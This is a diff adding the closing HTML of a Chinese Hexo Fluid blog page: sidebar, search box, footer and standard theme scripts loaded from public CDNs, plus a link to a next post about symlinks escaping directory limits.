+                      <a href="/2025/04/25/%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5%E7%AA%81%E7%A0%B4%E7%9B%AE%E5%BD%95%E9%99%90%E5%88%B6/" title="符号链接突破目录限制">
+                        <span class="hidden-mobile">符号链接突破目录限制</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  var relativeDate = function() {
+    var updatedTime = document.getElementById('updated-time');
+    if (updatedTime) {
+      var text = updatedTime.textContent;
+      var reg = /\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:\d{2})/;
+      var matchs = text.match(reg);
+      if (matchs) {
+        var relativeTime = moment(matchs[0]).fromNow();
+        updatedTime.textContent = text.replace(reg, relativeTime);
+      }
+      updatedTime.style.display = '';
+    }
+  };
+  Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/moment.min.js', function() {
+    if (!'zh-cn'.startsWith('en')) {
+      Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/locale/zh-cn.min.js', function() {
+        relativeDate();
+      });
+    } else {
+      relativeDate();
+    }
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
